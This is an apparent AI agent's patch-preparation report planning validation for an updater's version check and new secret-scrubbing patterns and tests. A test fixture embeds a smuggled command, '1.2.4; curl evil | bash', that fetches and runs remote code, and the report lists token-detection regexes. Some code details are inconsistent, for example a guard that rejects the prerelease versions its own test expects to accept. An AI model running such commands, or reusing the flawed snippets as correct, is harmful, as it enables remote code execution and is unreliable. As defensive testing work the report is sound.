# SPS2 ROUND 21A — UPDATER AND P17 SECURITY PATCH PREPARATION

Report time: 2026-10-16T19:17:45+06:00 (suffix 20261016-191745)
Mission: prepare a minimal, test-driven patch plan for Round 20B findings
T-01 (update trust chain) and T-07 (P17 scrub gaps), based on
`reports/SPS2-ROUND20B-DEEP-SECURITY-RELIABILITY-AUDIT-20261016-191028.md`.

**This is patch PREPARATION, not implementation.** The mission is explicit:
"Do not modify files until the User explicitly authorizes these two
implementation scopes." **No file in the repository was modified this
round.** Nothing was staged, committed, pushed, deployed, or published. The
only file created is this report. The live user state file
`~/.sps/update-state.env` was read once (read-only) to confirm the real-world
shape of the data; it was not touched.

---

## 1. Live worktree confirmation (exact scope)

| Item | Value at 19:16:55 +06 |
|---|---|
| Branch / HEAD | `build/roadmap-p3-completion` / `c49f3852…` (unchanged since Round 20B) |
| Porcelain / staged / stashes | 33 / 0 / 0 — identical to Round 20B's end state |
| Reports | 32 (Codex's Round 20 report at 19:02 remains the newest besides this one) |
| Concurrent work | None observed since 19:12. All 16 tracked modifications and 17 untracked entries are the same set Round 19/19B/20B reconciled. |

**Target-file fingerprints (SHA-256, snapshotted at start and re-verified at
19:17 — byte-identical throughout):**

| File | SHA-256 (first 16) |
|---|---|
| `scripts/check-update.sh` | `37af1927220ce0b4` |
| `scripts/check-update.ps1` | `020e551de553efdf` |
| `sps2/p17/scrub.py` | `153a9515d2ce6239` |
| `sps2/tests/test_updater_safety.py` | `d51c20dd98dda505` |
| `sps2/tests/test_p17_security.py` | `9e1f1ebabb560c96` |

If these hashes differ when the User authorizes implementation, the worktree
changed and the plan below must be re-verified against the new content
before editing.

**Scope boundaries confirmed live:**
- `check-update.sh` is consumed by `scripts/sps-update.sh:44` (the
  `checker()` function prefers it, with an inline fallback at `:51-66`);
  `check-update.ps1` likewise by `scripts/update-sps.ps1:25`. Both are
  required by `scripts/lint-sps.sh:75-76`. Neither is wired into CI.
- `check-update.sh` is **not** in the DEC-7201 ratified eight-file set
  (verified: that set is get-sps.sh/.ps1, bootstrap-sps.sh ×2,
  sps-update.sh ×2, update-sps.ps1 ×2 + the test module). It is therefore a
  *new* implementation scope requiring its own User authorization — exactly
  as this mission states.
- The updater's **inline fallback checker** (`sps-update.sh:51-66`) shares
  T-01's weaknesses (no remote-version format validation, `tr -d
  '[:space:]'` only). It is inside the DEC-7201-ratified files, but this
  plan keeps it out of scope unless the User extends the grant — flagging
  it here so the decision is informed (§6, risk R-5).
- `scrub.py` is inside the P17 workstream; editing it requires a User
  decision (Round 20B T-07 remediation row said the same).

## 2. Patch plan A — T-01: `scripts/check-update.sh`

### A1. Remote VERSION validation (new function, ~8 lines)

Add one validator near `is_greater`:

```bash
is_valid_version() {
  # Strict semver-ish: MAJOR.MINOR.PATCH with optional -PRERELEASE.
  # Remote content is untrusted input; anything else is treated as
  # "cannot determine latest", never as a known version.
  case "$1" in
    ''|*[!0-9.]*) return 1 ;;   # empty or any char outside digits/dots/dash
  esac
  printf '%s' "$1" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$'
}
```

Notes on the chosen shape:
- The current live VERSION is `4.0.0` (verified); the regex accepts it and
  any `-prerelease` suffix already implied by `is_greater`'s `${1%%-*}`
  split.
- `case` guard first rejects shell-hostile characters before grep, so no
  globbing/quoting surprises.
- **Deliberately strict**: `1.2` (two components) and `v1.2.3` (leading v)
  are rejected. If the project ever adopts such tags, the validator — not
  the comparison — must be widened, and that change will be visible.

### A2. Wire validation into the fresh-check path (2 edits)

At `check-update.sh:80-90` (the fresh-check block), after `latest` is
fetched:

```bash
if [[ -n "$latest" ]] && ! is_valid_version "$latest"; then
  echo "SPS version check: remote VERSION is malformed ($latest); treating as unavailable" >&2
  latest=""
fi
```

Then the existing `if [[ -z "$latest" || "$latest" == "unknown" ]]` offline
branch handles it unchanged — **preserving offline semantics exactly**:
malformed remote → `STATUS=offline`, `LATEST=unknown`, exit 2. This is the
mission's "never as evidence that the installed version is up to date":
today a malformed remote can produce either a bogus "up to date" (via
`is_greater` arithmetic errors) or a bogus "update available" with garbage
in the message and state file; after the patch it can produce only exit 2.

### A3. `CHECKED_AT` validation in the cached path (2 edits)

At `:63-67`, after grepping `last`:

```bash
if [[ -n "$last" ]] && ! [[ "$last" =~ ^[0-9]{1,12}$ ]]; then
  echo "SPS update state is corrupt (CHECKED_AT); ignoring cache" >&2
  last=""
fi
```

Emptying `last` makes the freshness test `(( now - last < TTL_SECONDS ))`
fail (empty expands to 0 → `now - 0 >= TTL`), so a corrupt/frozen cache
falls through to a fresh network check — the correct fail-open-to-network
direction. The 12-digit bound accommodates epoch seconds until year 33658
while rejecting the probe-verified freeze value and arbitrary garbage.
`STATUS`/`LATEST` from the cache need no extra validation: `LATEST` is only
echoed, never compared arithmetically in the cached path (the comparison
happens only on fresh checks, where A2 now validates first).

### A4. State-file write hardening (1-line change, both write sites)

The three `printf … > "$STATE_FILE"` writes (`:88, :94, :107`) use
`>` truncation — non-atomic. A crash mid-write leaves a partial state file
that A3 now rejects (safe), but the minimal hardening is to write through a
temp file:

```bash
printf 'CHECKED_AT=%s\nSTATUS=%s\nLATEST=%s\n' "$(date +%s)" "$status_val" "$latest" > "$STATE_FILE.tmp" \
  && mv "$STATE_FILE.tmp" "$STATE_FILE"
```

**Optional (recommend deferring):** this is a robustness nicety, not a
security fix; including it widens the diff. Default plan: include it only
if the User wants the full scope; the security-critical edits are A1–A3.

### A5. Explicitly out of scope for patch A

- `is_greater` itself: with A2 upstream, it only ever receives validated
  input; hardening it further is dead code. (T-08's benign-direction
  mis-sort is thereby closed transitively for remote input; local
  `installed` comes from the manifest/VERSION file and is compared with
  `=`, `>` only after remote validation — a malformed *local* value yields
  "update available", which is the safe direction and unchanged.)
- The inline fallback in `sps-update.sh:51-66` (see §6, R-5).
- `check-update.ps1` is patch B, not A.

## 3. Patch plan B — T-01: `scripts/check-update.ps1`

Mirror semantics, PS idiom:

### B1. Version validation

```powershell
function Test-VersionFormat {
    param([string]$Value)
    return ($Value -match '^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$')
}
```

At `:59` change the offline condition to
`if (-not $latest -or $latest -eq "unknown" -or -not (Test-VersionFormat $latest))`,
emitting `Write-Host "SPS version check: remote VERSION is malformed ($latest); treating as unavailable"` when malformed-else-nonempty, so the
`STATUS=offline` write and `exit 2` are reused unchanged.

### B2. `CHECKED_AT` validation

At `:38`, the cast `[int64]$parts[1]` **throws** under a hostile value —
but `$ErrorActionPreference = "SilentlyContinue"` (`:15`) silently converts
the throw into `$last = $null`, which then fails the freshness test → fresh
check. **Probed behavior is accidentally safe**, but by accident, not
construction, and a non-numeric value that *parses* as int64 (the freeze
value) still passes. Explicit fix at `:43`:

```powershell
if ($last -and (($now - $last) -lt $ttlSeconds) -and ($last -ge 0) -and ($last -le 999999999999)) {
```

(bound mirrors A3's 12 digits; `$last -ge 0` rejects negative freezes).

### B3. Regression risk unique to PS

`$ErrorActionPreference = "SilentlyContinue"` hides every mistake in this
file. The patch adds no new silently-continued paths (validation failures
route to the visible offline message), but the plan recommends — and does
not itself make — a future decision to raise it to `Stop` with explicit
try/catch. Out of scope here.

**Testing limitation (environmental, disclosed):** `pwsh` is absent on this
machine (verified). The PS patch is source-verified only; behavioral
verification requires a pwsh environment (same gap as the existing
updater-safety suite's skipped test). The plan adds no PowerShell test it
cannot run.

## 4. Patch plan C — T-01 regression tests (new file `sps2/tests/test_check_update_safety.py`)

New standalone module (~120–150 lines), unittest, stdlib-only, following
the conventions of `test_updater_safety.py` (repo-relative paths, temp
fixtures, subprocess with controlled env, 15s timeouts). **Why a new module
rather than extending `test_updater_safety.py`:** check-update.sh is not in
the DEC-7201 ratified set; a separate module keeps the ratified module's
hash stable and lets the User authorize the two scopes independently.

Test matrix (each runs the real script in a temp `HOME` with network
neutralized — see C-0):

| # | Test | Fixture | Expected |
|---|---|---|---|
| C-0 | harness control: network independence | `curl` shadowed by a stub that exits 2 / a PATH without curl | script reaches the offline branch deterministically; no real network (also asserted by the suite-level FORBIDDEN pattern used in P17 tests) |
| C-1 | **future CHECKED_AT does not freeze the cache** | state file `CHECKED_AT=99999999999999, STATUS=update-available` | pre-patch: exit 1 "cached" (the Round 20B freeze). Post-patch: cache ignored → fresh check → offline branch → exit 2; state file rewritten with a sane timestamp |
| C-2 | **corrupt CHECKED_AT ignored** | `CHECKED_AT=not-a-number` | same as C-1 (fresh check runs) |
| C-3 | **fresh cache still honored** | `CHECKED_AT=<now>, STATUS=up-to-date, LATEST=4.0.0` | exit 0, "(cached)" in output — proves the TTL path wasn't broken by the validation |
| C-4 | **malformed remote VERSION → offline, never up-to-date** | curl stub emitting `1.2.4; curl evil \| bash` | pre-patch: arithmetic errors + `STATUS=update-available` persisted. Post-patch: "malformed" on stderr, `STATUS=offline, LATEST=unknown`, exit 2, **and the state file contains no attacker-controlled LATEST value** |
| C-5 | **non-version garbage → offline** | curl stub emitting `pwned` | exit 2, offline state |
| C-6 | **valid remote, equal → up to date** | curl stub emitting `4.0.0`, manifest fixture `SPS_VERSION=4.0.0` | exit 0, `STATUS=up-to-date, LATEST=4.0.0` persisted |
| C-7 | **valid remote, newer → update available** | curl stub `4.1.0` vs local `4.0.0` | exit 1, `STATUS=update-available` |
| C-8 | **valid remote, local ahead (dev build) → up to date** | curl stub `3.9.0` vs local `4.0.0` | exit 0 (preserves the existing `is_greater` dev-build semantics) |
| C-9 | **missing state file → fresh check** | no state file, curl stub offline (exit 1, empty) | exit 2, offline state created |
| C-10 | **`--force` bypasses a frozen cache** | C-1's fixture + `--force` | fresh check runs even pre-patch; pins the force semantics the patch must not break |
| C-11 | **prerelease accepted** | curl stub `4.1.0-beta.1` vs `4.0.0` | exit 1 (guards the regex against over-tightening) |
| C-12 | **leading-v and two-component rejected** | curl stubs `v4.1.0`, `4.1` | exit 2 both (pins the strict validator) |

Mechanics shared by all tests: `HOME`/`state file` pointed into
`tempfile.TemporaryDirectory()`; the script is invoked as
`bash scripts/check-update.sh [--force]` with `PATH` prefixed by a stub dir
containing a fake `curl` (C-0's stub is the only network guarantee); the
manifest fixture is written to `<home>/.sps/install-manifest.env`. **No
test reads or writes the real `~/.sps`** (the live state file observed this
round is only an audit input, never a fixture).

**CI note (no CI change required):** the new module is untracked until
commit authorization; when a commit is later authorized, CI's
`git ls-files`-derived module list picks it up automatically, and
`.github/expected-test-modules.txt` (28 entries, 9 `sps2.tests.*`) would
need one added line — **that manifest edit is a CI-adjacent change to be
requested at commit time, not now** (DEC-7203 stands).

## 5. Patch plan D — T-07: `sps2/p17/scrub.py`

### D1. Five narrowly scoped pattern additions (appended to `PATTERNS`)

| Label | Regex (anchored, high-signal only) | Rationale from Round 20B probes |
|---|---|---|
| `provider-token` (extend) | add `ASIA[0-9A-Z]{16}` and `xapp-1-[A-Za-z0-9-]{10,}` to the existing alternation | AWS **session** tokens (ASIA) are the ephemeral form of the already-covered AKIA; Slack app tokens are the app-level sibling of the covered `xox[baprs]-` |
| `gitlab-pat` (new) | `\bglpat-[A-Za-z0-9_\-]{16,}\b` | GitLab PATs; fixed `glpat-` prefix keeps false positives near zero |
| `pem-block` (extend) | relax the existing private-key/cert patterns to `-----BEGIN[A-Z ]*PRIVATE KEY-----` (space optional) | the probe's no-space variant escaped because the pattern required `[A-Z ]*` to match at least the space; making the space optional closes it without loosening anything else |
| `base64-credential` (new, deliberately conservative) | `\bcGFzc3dvcmQ6|dXNlcjpf|YXV0aDp\b` — **NOT** a general base64 matcher | a general base64 rule would redact every digest, license key, and fixture blob in transcripts (the existing test `test_digests_are_not_mistaken_for_secrets` pins that digests survive). Instead: match only the base64 encodings of the fixed prefixes `password:`, `user:`, `auth:` (`cGFzc3dvcmQ6`, `dXNlcjog`/`dXNlcjpf` covers `user: `/`user:_`, `YXV0aDo`). This is a narrow, documented hedge against the probe's `cGFzc3dvcmQ6IGh1bnRlcjI=` shape, not a claim of general base64 coverage |

**Rejected as too broad** (documented so the decision is informed): generic
40-hex matchers (would redact every SHA-1-shaped digest — collides with the
digest-preservation test), entropy-based detection (non-deterministic,
untestable in unit tests), and splitting-assignment reconstruction (the
probe's `"abc" + "1234567890123456"` case was caught by the existing
`assignment` pattern in combination; a string-concatenation parser is out
of proportion for a defense-in-depth layer whose first line of defence is
the minimal environment).

### D2. Positive and negative tests (added to `sps2/tests/test_p17_security.py`, extending `test_scrub_covers_the_recorded_shapes` and adding one negative sibling)

**Positive (must be redacted):**

| Input | Expected class |
|---|---|
| `ASIAABCDEFGHIJKLMNOP` | provider-token |
| `xapp-1-A0123456789-0123456789` | provider-token |
| `glpat-AbCdEfGhIjKlMnOpQrSt` | gitlab-pat |
| `-----BEGINRSAPRIVATEKEY-----…` (no interior space) | private-key-block |
| `cGFzc3dvcmQ6IGh1bnRlcjI=` | base64-credential |

**Negative (must survive untouched — the anti-over-redaction guard):**

| Input | Why it must survive |
|---|---|
| `plan_sha256=` + `"a"*64` | existing pinned digest case (kept green) |
| `AKIA`-less hex blob `"deadbeef"*8` | 64-hex digests are not secrets |
| `ASIA`-shaped but short: `ASIA1234` | below the 16-char body bound — no over-trigger on short IDs |
| `glpat-` alone, and `glpat-short1` | below the 16-char body bound |
| `xapp-1-short` | below bound |
| `cGFzc3dvcmRz` (base64 of "passwords", no colon) | prefix-without-colon must not trigger |
| `-----BEGIN CERTIFICATE-----` **empty block** | the relaxed PEM pattern still requires the full BEGIN/END pair |
| `Bearer ` + 8 chars | below the existing 16-char bearer bound (already-covered negative, retained) |

Each positive asserts `[REDACTED]` in the cleaned text and the expected
label in `removed`; each negative asserts `removed == []` and the original
text unchanged. All findings use fake/short values — no real credential
material is introduced into the repository (the existing suite's sentinel
discipline is followed).

### D3. What is explicitly preserved

- `MINIMAL_ENV` / `build_environment` in `execution.py` — untouched (the
  mission's "preserve the minimal-environment control").
- `assert_clean` fail-closed write gate, `SecretLeak`, `scrub_obj` —
  untouched; the new patterns flow through them unchanged.
- GATE-P17-4 (real-agent execution disabled) — untouched; no runner,
  allowlist, or confinement change.
- The scrub marker `[REDACTED]`, the env-assignment group-preserving
  substitution, and the `label_is_env` dispatch — untouched.

## 6. Compatibility risks

| # | Risk | Assessment | Mitigation in plan |
|---|---|---|---|
| R-1 | Validator too strict → a legitimate future VERSION format is treated as offline | Real but fail-safe: worst case is a missed update notice (exit 2), never a wrong "up to date". The live VERSION (`4.0.0`) and the `is_greater` prerelease split both fit the regex. | C-11/C-12 pin the accepted shape both ways; widening later is a one-line, visible change |
| R-2 | `CHECKED_AT` bound (12 digits) rejects a legitimately huge value | Epoch seconds hit 13 digits in year 33658 | Documented; not a practical risk |
| R-3 | New scrub patterns over-redact P17 transcripts | The negative test set (§D2) pins digests, short IDs, and colon-less base64 as survivors; `assert_clean` failures would surface loudly in the 62-test suite | Positive+negative pairs for every pattern |
| R-4 | `base64-credential` prefix list is inherently incomplete (only 3 prefixes) | True by design — documented as a narrow hedge, not general coverage; the module's own docstring already disclaims proof of absence | Docstring updated to enumerate exactly what the hedge covers |
| R-5 | The **inline fallback checker** in `sps-update.sh:51-66` keeps the old unvalidated behavior | It only runs when `check-update.sh` is absent (older installs); every current install path has the real script. Fixing it would touch a DEC-7201-ratified file, expanding the authorization scope. | Left out of scope; flagged for a follow-up decision |
| R-6 | PS patch untestable here (no pwsh) | Environmental, pre-existing | Source-verified only; disclosed; no PS test added that cannot run |
| R-7 | New test module added to a CI manifest later → CI behavior change | Deferred to commit time; zero CI change now | §4 CI note |
| R-8 | Concurrent Codex edits to the same files during implementation | None observed this round; hashes pinned in §1 | Re-verify hashes immediately before editing; if changed, re-read and reconcile first |

## 7. Verification plan (post-authorization, pre-report)

1. `bash -n scripts/check-update.sh` (and the untouched ratified scripts
   remain `bash -n` clean).
2. `python3 -B -m unittest sps2.tests.test_check_update_safety` — new
   module, 13+ tests green.
3. `python3 -B -m unittest sps2.tests.test_updater_safety` — 13 tests still
   green (proves no collateral damage to the ratified module).
4. `python3 -B -m unittest sps2.tests.test_p17_security` — 62 + ~13 new =
   ~75 tests green (scrub positives, negatives, and all existing
   confinement/execution tests).
5. Full P17 battery re-run (lifecycle 44, pinning 25, e2e 2, gate
   attribution 5) — proves the scrub change does not disturb the runner.
6. `python3 -B sps2/tools/validate-sps2.sh` — must remain at its current
   78-pass/1-fail baseline (the single legacy-modified failure is the
   pre-existing T-06 conflict, unrelated to this patch).
7. Real P10 gate — must remain exit 1 with the same 7 required-control
   failures (no governance state change).
8. Hash-diff every touched file; confirm no other file changed; record
   before/after fingerprints in the implementation report.

## 8. Authorization required (explicit)

| Scope | Files | Status |
|---|---|---|
| A + C | `scripts/check-update.sh`, new `sps2/tests/test_check_update_safety.py` | **Requires User authorization** (not in DEC-7201's ratified set) |
| B | `scripts/check-update.ps1` | **Requires User authorization** (same) |
| D | `sps2/p17/scrub.py`, `sps2/tests/test_p17_security.py` (test additions only) | **Requires User authorization** (P17 workstream edit) |

Not included in any scope, regardless of authorization: CI files,
installers, uninstaller, governance contracts, approval records,
publication state, `sps-update.sh`/`update-sps.ps1` (ratified files, R-5),
the live `~/.sps` state, and any staging/commit/push.

## 9. Side-effect verification

- Files modified this round: **none**. Files created: **this report only**.
- Target-file hashes verified identical at 19:16:55 and 19:17:45.
- Git: HEAD `c49f3852…`, 33 porcelain (unchanged set), 0 staged, 0 stashes.
- Read-only observations performed: `bash -n` on check-update.sh; one read
  of the live `~/.sps/update-state.env` (content: sane 2026-era timestamp,
  `STATUS=up-to-date`, `LATEST=4.0.0` — i.e., the deployed state file is
  currently healthy; the freeze risk is prospective, not active); scrub
  performance probe (200 KB in 14 ms — no performance concern for the
  pattern additions).
- No installer, updater, bootstrap, or network-dependent script executed.
  No CI, governance, approval, or publication state touched.

---

*Round 21A complete: a precise, test-first patch plan for T-01 (scopes
A/B/C) and T-07 (scope D), with 13 planned updater tests and ~18 planned
scrub tests, compatibility risks enumerated, and every scope explicitly
held for User authorization. No repository file was modified. Stopping
here — awaiting the User's authorization decision.*
